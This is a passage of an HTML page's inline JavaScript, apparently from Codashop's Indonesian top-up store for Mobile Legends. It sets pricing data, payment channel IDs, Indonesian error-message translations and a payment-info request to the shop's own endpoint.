kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1200000.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.200.000","deal":false},{"id":27702,"voucherDenominationId":3724,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false}]');
            CODA.Shop.var.theLanguage = 'in';
            CODA.Shop.constant.SELLER_NAME = 'Mobile Legends';
            CODA.Shop.constant.CURRENCY_NAME = 'IDR';
            CODA.Shop.constant.LANGUAGE_CODE = 'in';
            CODA.Shop.VoucherType = '5';

            if (`false` === 'true') {
                CODA.Shop.constant.EMAIL_TEXT = 'Pastikan bahwa alamat email anda tepat, kami akan pakai email tersebut untuk mengirim kode voucher anda.';
            } else {
                CODA.Shop.constant.EMAIL_TEXT = 'Optional: Jika anda ingin mendapatkan bukti pembayaran atas pembelian anda, harap mengisi alamat emailnya';
            }
            CODA.Shop.smcServerListJson = JSON.parse('null');
            CODA.Shop.Column.sellerGroup.userEmailRequired = `false`;
            CODA.Shop.Column.sellerGroup.voucherTypeName = `MOBILE_LEGENDS`;
            CODA.Shop.property.ProductAction.variableDenomPriceMaxAmount = '0.0';
            CODA.Shop.property.ProductAction.displayVariablePriceText = 'Enter amount';
            CODA.Shop.property.ProductAction.displayCurrencySymbol = 'Rp. ';
            CODA.Shop.property.ProductAction.variableDenomPriceMinAmount = '0.0';
            CODA.Shop.property.PaymentChannelInfo.XLID = '23';
            CODA.Shop.property.PaymentChannelInfo.TELKOMSELID = '24';
            CODA.Shop.property.PaymentChannelInfo.BOLTID = '25';
            CODA.Shop.property.PaymentChannelInfo.HUTCH_THREEID = '26';
            CODA.Shop.property.PaymentChannelInfo.SEVELINID = '224';
            CODA.Shop.property.PaymentChannelInfo.indosatID = '22';
            CODA.Shop.property.PaymentChannelInfo.smartLiID = '91';
            CODA.Shop.property.VoucherType.HEROES_EVOLVED_KEY = "4";
            CODA.Shop.translation.variablePriceAmountLimit = 'Price limt exceeds';
            CODA.Shop.translation.priceCap = 'Harga';
            CODA.Shop.translation.notAvailableForDenom = 'Tidak tersedia untuk denominasi ini';
            CODA.Shop.translation.invalidVoucher = 'Silahkan pilih nomor voucher';
            CODA.Shop.translation.invalidPaymentMethod = 'Silahkan pilih metode pembayaran';
            CODA.Shop.translation.invalidEmail = 'Silahkan isi email address yang dapat dipakai';
            CODA.Shop.translation.invalidMobileNumber = 'Silahkan isi No.telepon';
            CODA.Shop.translation.invalidMobileNumberLength = 'Nomor ponsel Anda minimal harus 10 angka (i.e. 08XXXXXXXXX)';
            CODA.Shop.translation.validateHeader = 'Salah satu informasi (atau lebih) yang Anda masukkan tidak tepat:';
            CODA.Shop.translation.idFormatErrorHeader = 'Format ID Salah!';
            CODA.Shop.translation.idFormatErrorContent = 'Salah!</br>Format ID yang benar adalah  12345678.';
            CODA.Shop.translation.iggIdFormatErrorHeader = 'Format IGG ID Salah!';
            CODA.Shop.translation.iggIdFormatErrorContent = 'Salah!</br>Format IGG ID yang benar adalah  12345678.';
            CODA.Shop.translation.idFormatErrorContent_withServer = 'Salah!</br>Format ID yang benar adalah  12345678(123-Server Name).';
            CODA.Shop.translation.idNumberFormatErrorHeader = 'Format Nomor ID salah!';
            CODA.Shop.translation.userIdFormatErrorHeader = 'Format UserID salah.';
            CODA.Shop.translation.accountIdFormatErrorHeader = 'Format Account ID or Server name salah!';
            CODA.Shop.translation.playerIdFormatErrorHeader = 'Format Player ID salah.';
            CODA.Shop.translation.nicknameFormatErrorHeader = 'Format Nickname salah!';
            CODA.Shop.translation.sidFormatErrorHeader = 'Format SID Salah!';
            CODA.Shop.translation.userIdFormatErrorContent = 'Salah!<br/> Format yang benar adalah  12345678.';
            CODA.Shop.translation.userIdFormatErrorContent_withServer = 'Salah!<br/> Format yang benar adalah  12345678(1234).';
            CODA.Shop.translation.memberNoOrAdmiralNoFormatErrorHeader = 'Format No. Member atau No. Admiral salah';
            CODA.Shop.translation.memberNoOrAdmiralNoFormatErrorContent = 'Salah!</br>For No. Member atau No. Admiral yang benar adalah 12345678 - 12345678';
            CODA.Shop.translation.accountIdFormatErrorContent_withServer = 'Salah!</br>Format ID yang benar adalah  12345678(123-Server Name).';
            CODA.Shop.translation.idNumberFormatErrorContent = 'Salah! </br>Format ID yang benar';
            CODA.Shop.translation.accountIdFormatErrorContent = 'Salah!</br>Format ID yang benar adalah {0}';
            CODA.Shop.translation.playerIdFormatErrorContent = 'Contoh format Player ID:  12345678.';
            CODA.Shop.translation.playerIdFormatErrorContent_withServer = 'Contoh format Player ID:  12345678(Server xxx).';
            CODA.Shop.translation.playerIdFormatErrorContent_withServerOS = 'Contoh format Player ID:  OS + Server + 12345678';
            CODA.Shop.translation.sidFormatErrorContent = 'Salah!</br>Format SID yang benar adalah';
            CODA.Shop.translation.nicknameFormatErrorContent = 'Format Nickname yang benar adalah User1234.';
            CODA.Shop.translation.rolenumberFormatErrorHeader = 'Format Role Number Salah!';
            CODA.Shop.translation.rolenumberFormatErrorContent = 'Salah!</br>Format Role Number yang benar adalah';
            CODA.Shop.translation.uidFormatErrorHeader = 'Format OpenID Salah!';
            CODA.Shop.translation.uidFormatErrorContent = 'Salah!</br>Format OpenID yang benar adalah  12345678.';
            CODA.Shop.translation.rememberMe = 'Ingat saya';
            CODA.Shop.translation.buyNow = 'Beli sekarang';
            CODA.Shop.translation.needYourEmail = 'Pastikan bahwa alamat email anda tepat, kami akan pakai email tersebut untuk mengirim kode voucher anda.';
            CODA.Shop.translation.emailOptional = 'Optional: Jika anda ingin mendapatkan bukti pembayaran atas pembelian anda, harap mengisi alamat emailnya';
            CODA.Shop.translation.readMore = 'Baca lebih lanjut';
            CODA.Shop.translation.readLess = 'Kurangi Membaca';
            CODA.Shop.translation.outOfStockMsgHeader = 'Maaf!';
            CODA.Shop.translation.outOfStockMsgContent = 'Voucher ini sudah habis. Silahkan cek kembali dalam beberapa saat.';
            CODA.Shop.translation.memberValidFailHeader = 'Maaf!';
            CODA.Shop.translation.memberValidFailContent = 'Anda hanya dapat membeli Starlight Member 1 kali setiap bulannya dengan 1 akun.';
            CODA.Shop.translation.seasonMemberValidFailContent = 'User hanya bisa membeli Starlight Member Seasonal 1 kali dalam 93 hari (3 bulan) untuk 1 akun.';
            CODA.Shop.translation.moontonTwilightPassOneTimeContent = 'Setiap user hanya dapat membeli Twilight Pass satu kali.';
            CODA.Shop.translation.moontonSeasonalPassPremiumOneTimeContent = 'Setiap user hanya dapat membeli Seasonal Pass Premium satu kali.';
            CODA.Shop.translation.limitedPurchaseContent = 'Saat ini item tidak tersedia untuk akun anda. Mohon cek keterangan produk untuk mengetahui syarat yang berlaku';
            CODA.Shop.translation.mlVersionForbiddenContent = 'Maaf, ID yang Anda gunakan adalah ID Mobile Legends versi VNG, yang dimana tidak dapat digunakan di Codashop.';
            CODA.Shop.translation.loveNikkiOneTimeHeader = 'Maaf!';
            CODA.Shop.translation.loveNikkiOneTimeContent = 'Setiap akun memiliki kesempatan terbatas untuk dapat membeli penawaran spesial ini. Silahkan kunjungi halaman TopUp Love Nikki untuk membeli tambahan topup.';
            CODA.Shop.translation.foodFantasyOneTimeHeader = 'Maaf!';
            CODA.Shop.translation.foodFantasyOneTimeContent = 'Setiap akun memiliki kesempatan terbatas untuk dapat membeli Gift Pack ini. Silahkan kunjungi halaman TopUp Food Fantasy untuk membeli tambahan topup.';
            CODA.Shop.translation.foodFantasyExpireHeader = 'Maaf!';
            CODA.Shop.translation.foodFantasyExpireContent = 'Gift Pack ini Kadaluarsa! Silahkan kunjungi halaman TopUp Food Fantasy untuk membeli tambahan topup.';
            CODA.Shop.translation.idNotFoundHeader = 'ID tidak ditemukan';
            CODA.Shop.translation.idNotFoundContent = 'Kami tidak menemukan ID:';
            CODA.Shop.translation.idNumberNotFoundHeader = 'Nomor ID tidak dapat ditemukan';
            CODA.Shop.translation.idNumberNotFoundContent = 'Kami tidak dapat menemukan Nomor ID : ';
            CODA.Shop.translation.userIdNotFoundHeader = 'User ID Tidak ditemukan!';
            CODA.Shop.translation.nicknameNotFoundHeader = 'Nickname Tidak ditemukan!';
            CODA.Shop.translation.userIdNotFoundContent = 'Kami tidak menemukan User ID:';
            CODA.Shop.translation.nicknameNotFoundContent = 'Kami tidak menemukan nickname:';
            CODA.Shop.translation.iggIdNotFoundHeader = 'IGG ID tidak ditemukan';
            CODA.Shop.translation.iggIdNotFoundContent = 'Kami tidak menemukan IGG ID:';
            CODA.Shop.translation.memberNoOrAdmiralNoNotFoundHeader = 'No. Member atau No. Admiral tidak ditemukan!';
            CODA.Shop.translation.memberNoOrAdmiralNoNotFoundContent = 'Kami tidak dapat menemukan No. Member atau No. Admiral :';
            CODA.Shop.translation.accountIdNotFoundHeader = 'Account ID tidak ditemukan!';
            CODA.Shop.translation.accountIdNotFoundContent = 'Kami tidak menemukan Account ID(Server Name) : ';
            CODA.Shop.translation.playerIdNotFoundHeader = 'Player ID Tidak ditemukan!';
            CODA.Shop.translation.playerIdNotFoundContent = 'Player ID ini tidak dapat ditemukan:';
            CODA.Shop.translation.uidNotFoundHeader = 'OpenID tidak ditemukan';
            CODA.Shop.translation.uidNotFoundContent = 'Kami tidak menemukan OpenID:';
            CODA.Shop.translation.sidNotFoundHeader = 'SID Tidak Ditemukan!';
            CODA.Shop.translation.sidNotFoundContent = 'Kami tidak dapat menemukan SID anda';
            CODA.Shop.translation.itemInvalidHeader = 'Maaf!';
            CODA.Shop.translation.itemInvalidContent = 'Item yang anda pilih sudah tidak tersedia.';
            CODA.Shop.translation.userNotEligibleHeader = 'Maaf!';
            CODA.Shop.translation.userNotEligibleContent = 'ID anda tidak memenuhi syarat untuk membeli item ini.';
            CODA.Shop.translation.requirementNotMetHeader = 'Pembelian tidak dapat dilakukan';
            CODA.Shop.translation.requirementNotMetContent = '<h3>Syarat pembelian tidak terpenuhi, mohon baca instruksi berikut:</h3></br><li>Harap di ingat beberapa pembelian paket memiliki batas harian.</br></li><li>Event yang berbeda memiliki paket yang berbeda, pastikan terlebih dahulu paket yang ingin Anda beli tersedia di dalam game.</br></li><li>Pastikan telah bergabung dengan Union sebelum melakukan pembelian paket Union.</br></li><li>Pastikan Monthly Card Anda telah aktif sebelum mengupgrade Monthly Card Anda.</br></li>';
            CODA.Shop.translation.loginRequiredHeader = 'Maaf!';
            CODA.Shop.translation.loginRequiredContent = 'Agar dapat melakukan top up, akun pengguna harus login terlebih dahulu.';
            CODA.Shop.translation.processErrorHeader = 'Maaf!';
            CODA.Shop.translation.CPF_NumberIncorrect = '';
            CODA.Shop.translation.processErrorContent = 'Pesanan anda tdak dapat di proses. Silahkan coba lagi dalam beberapa menit kedepan.';
            CODA.Shop.translation.internalError = 'Agar dapat melakukan top up, akun pengguna harus login terlebih dahulu.';
            CODA.Shop.translation.notAvailable = 'Tidak tersedia';
            CODA.Shop.translation.fullNameRequired = '';
            CODA.Shop.translation.CPFMinimumLength = '';
            CODA.Shop.translation.CPFNumberRequired = '';
            CODA.Shop.translation.mobileNumberLabelStart = 'Mohon masukan no handphone';
            CODA.Shop.translation.mobileNumberLabelEnd = 'anda. Kamu akan menerima SMS dengan instruksi untuk menyelesaikan pembelian anda.';
            CODA.Shop.translation.mobileNumberPlaceholder = 'Masukan no.telepon';
            CODA.Shop.translation.mobileNumberLabel = '';
            CODA.Shop.translation.mobileNumberSendSmsLabel = '';
            CODA.Shop.translation.mobileNumberSendSmsPlaceholder = '';
            CODA.Shop.translation.unableToCheckUserAcc = 'Maaf, kami tidak dapat cek akun user Anda. Silahkan coba lagi nanti.';
            CODA.Shop.translation.serverTempNotAvailable = 'Maaf, untuk sementara Server tidak tersedia.';
            CODA.Shop.translation.purchaseProcessUnavailable = 'Saat ini kami tidak dapat memproses pembelian Anda. Silahkan coba lagi nanti.';
            CODA.Shop.translation.emailAddress = 'Alamat E-mail';
            CODA.Shop.translation.fullName = '';
            CODA.Shop.translation.CPFNumber = '';
            CODA.Shop.translation.rememberMyDetails = 'Ingat saya';
            CODA.Shop.translation.nicknameNotFoundContent = 'Kami tidak menemukan nickname:';
            CODA.Shop.translation.nicknameNotFoundHeadeir = 'Nickname Tidak ditemukan!';
            CODA.Shop.translation.rolenumberNotFoundHeader = 'Role Number Tidak Ditemukan!';
            CODA.Shop.translation.rolenumberNotFoundContent = 'Kami tidak menemukan Role Number:';
            CODA.Shop.translation.userIdConfirmContentVN_VR1 = 'Please make sure your voucher denomination is ';
            CODA.Shop.translation.userIdConfirmContentVN_VR2 = '****Note that your recharge voucher must match the price you purchased. For example, you cannot use four vouchers of 50,000 ? to pay for a purchase of 200,000 ?. A voucher worth 200,000 is required.****';
            CODA.Shop.translation.selectOs = '';
            CODA.Shop.translation.oops = 'Verifikasi Dibutuhkan!';
            CODA.Shop.url.initPaymentAction = `https://order.codashop.com/initPayment.action`;
            CODA.Shop.url.AWSHost = 'https://cdn1.codashop.com/S';
            CODA.Shop.url.addExInfo = "/addExInfo.action";
            CODA.Shop.Country.BR = 'false';
            CODA.Shop.var.isAllowTxn = true;
        });

        function addExInfo(exUserInfo) {
            var isSuccess = false;
            if (CODA.Shop.initPaymentData.beInitSess != null) {
                CODA.Shop.initPaymentData["exUserInfo"] = exUserInfo;
                isSuccess = true;
            } else {
                CODA.Shop.initPaymentData["exUserInfo"] = exUserInfo;
                CODA.Shop.initPaymentData["txnId"] = CODA.Shop.txnId;
                $.ajax({
                    type: "GET",
                    async: false,
                    url: "/addExInfo.action",
                    data: CODA.Shop.initPaymentData,
                    dataType: 'json',
                    timeout: 30000,
                    success: function(data) {
                        try {
                            var response = JSON.parse(data);
                            if (response.result && response.success) {
                                window.location.href = response.result;
                                isSuccess = true;
                            } else {
                                if (response && response.RESULT_CODE == 0) {
                                    var message = CODA.ResultCodes.codes[response.RESULT_CODE] ? CODA.ResultCodes.codes[response.RESULT_CODE].filter(function(val) {
                                        return val.lang == 'in';
                                    })[0] : ''
                                    if (!message) {
                                        message = CODA.ResultCodes.codes[response.RESULT_CODE] ? CODA.ResultCodes.codes[response.RESULT_CODE].filter(function(val) {
                                            return val.lang == 'default';
                                        })[0] : ''
                                    }
                                    if (message) {
                                        $('#errorMessage').html(message.text);
                                        $('#errorHeader').html("");
                                        $(".popError").show();
                                    }
                                    isSuccess = true;
                                    return;
                                } else if (response && response.errorMsg) {
                                    $('#errorMessage').html(response.errorMsg);
                                    $('#errorHeader').html("");
                                    $(".popError").show();
                                    return;
                                }
                                // throw new Error('Internal Error');
                            }
                        } catch (e) {
                            // $('#errorMessage').html('Maaf, kami tidak dapat menyelesaikan pembelian Anda');
                            // $('#errorHeader').html("");
                            // $(".popError").show();
                        }
                    },
                    error: function(XMLHttpRequest, textStatus) {
                        $('#errorMessage').html('Maaf, kami tidak dapat menyelesaikan pembelian Anda');
                        $('#errorHeader').html("");
                        $(".popError").show();
                    },
                    dataType: "text"
                });
            }
            return isSuccess;
        }
    </script>

    <a href="https://plus.google.com/104822527805498875313" style="display: none;" rel="publisher">Google+</a>

    <!-- at the bottom of the page -->
    <script type="text/javascript">
        window.mdc.autoInit();
    </script>

</body>

</html>